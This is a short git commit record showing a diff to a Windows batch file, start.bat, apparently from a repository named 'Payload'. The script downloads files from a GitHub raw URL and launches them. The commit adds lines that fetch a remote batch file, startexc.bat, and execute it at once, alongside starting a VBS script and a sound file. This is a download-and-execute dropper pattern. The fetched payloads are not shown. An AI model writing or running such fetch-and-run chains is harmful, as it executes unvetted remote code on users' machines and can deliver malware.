082f379141ac0cd39eaaa47cd33eae0e7fabb9d7
DanielNov2014 <michaelvinthermoller@gmail.com>
2025-04-14 14:59:43 +0200

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,5 +1,7 @@
 curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk2
 curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/sound.wav
+curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/startexc.bat
+start startexc.bat
 start sound.wav
 start talk2.vbs
 timeout 3 > nul
